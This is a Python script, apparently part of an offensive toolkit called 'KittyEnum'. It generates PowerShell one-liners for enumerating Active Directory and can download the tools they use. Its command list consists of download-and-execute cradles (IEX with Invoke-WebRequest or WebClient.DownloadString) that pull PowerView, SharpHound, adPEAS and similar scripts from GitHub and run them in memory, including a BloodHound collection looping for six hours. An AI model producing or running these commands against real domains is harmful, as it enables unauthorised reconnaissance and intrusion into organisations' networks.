#!/usr/bin/env python3
"""KittyEnum Active Directory PowerShell helper.

This module generates Active Directory PowerShell enumeration snippets and can
optionally download the raw PowerShell tools the snippets reference.
"""

import argparse
import os
import urllib.request
from datetime import datetime

MAGENTA = "\033[95m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RESET = "\033[0m"
BOLD = "\033[1m"

AD_TOOLS = {
    "adPEAS": "https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1",
    "adPEAS-Light": "https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS-Light.ps1",
    "BloodHound": "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1",
    "Invoke-ADEnum": "https://raw.githubusercontent.com/Leo4j/Invoke-ADEnum/main/Invoke-ADEnum.ps1",
    "PowerUpSQL": "https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1",
    "PowerView": "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1",
    "ADModule": "https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1",
}

COMMAND_TEMPLATES = [
    "# adPEAS",
    "IEX(IWR -usebasicparsing {adPEAS});Invoke-adPEAS",
    "IEX(IWR -usebasicparsing {adPEAS-Light});Invoke-adPEAS",
    "",
    "# BloodHound",
    "IEX(IWR -usebasicparsing {BloodHound});Invoke-Bloodhound -CollectionMethod \"All,GPOLocalGroup\"",
    "IEX(IWR -usebasicparsing {BloodHound});Invoke-Bloodhound -CollectionMethod \"All,GPOLocalGroup\" -Loop -Loopduration 06:00:00 -LoopInterval 00:15:00",
    "",
    "# Invoke-ADEnum",
    "IEX(IWR -UseBasicParsing {Invoke-ADEnum});Invoke-ADEnum",
    "",
    "# PowerUpSQL",
    "IEX(New-Object System.Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1\")",
    "",
    "# PowerView",
    "IEX(IWR -usebasicparsing {PowerView})",
    "",
    "# Native AD Module",
    "iex (new-Object Net.WebClient).DownloadString('{ADModule}');Import-ActiveDirectory",
]

def info(message):
    print(f"{MAGENTA}{BOLD}[AD-PS]{RESET} {message}")


def ok(message):
    print(f"{GREEN}{BOLD}[OK]{RESET} {message}")


def warn(message):
    print(f"{YELLOW}{BOLD}[WARN]{RESET} {message}")


def dump_commands(outdir):
    path = os.path.join(outdir, "ad_powershell_commands.txt")
    with open(path, "w", encoding="utf-8") as f:
        f.write(f"# KittyEnum Active Directory PowerShell enumeration commands\n")
        f.write(f"# Generated: {datetime.utcnow().isoformat()}Z\n\n")
        for line in COMMAND_TEMPLATES:
            if "{" in line:
                f.write(line.format(**AD_TOOLS) + "\n")
            else:
                f.write(line + "\n")
    ok(f"Created command snippet file: {path}")
    return path


def download_scripts(outdir):
    script_dir = os.path.join(outdir, "ad_scripts")
    os.makedirs(script_dir, exist_ok=True)
    for name, url in AD_TOOLS.items():
        local_path = os.path.join(script_dir, f"{name}.ps1")
        info(f"Downloading {name} → {local_path}")
        try:
            with urllib.request.urlopen(url, timeout=30) as response, open(local_path, "wb") as out:
                out.write(response.read())
            ok(f"Downloaded {name}")
        except Exception as exc:
            warn(f"Failed to download {name}: {exc}")
    return script_dir


def main():
    parser = argparse.ArgumentParser(description="KittyEnum Active Directory PowerShell helper module")
    parser.add_argument("--outdir", default="./recon-output")
    parser.add_argument("--download", action="store_true", help="Download AD PowerShell tools into output folder")
    args = parser.parse_args()

    os.makedirs(args.outdir, exist_ok=True)
    info("Generating Active Directory PowerShell command snippets")
    dump_commands(args.outdir)
    if args.download:
        download_scripts(args.outdir)
        ok("Downloaded PowerShell AD tools")
    ok("Active Directory PowerShell helper complete")


if __name__ == "__main__":
    main()
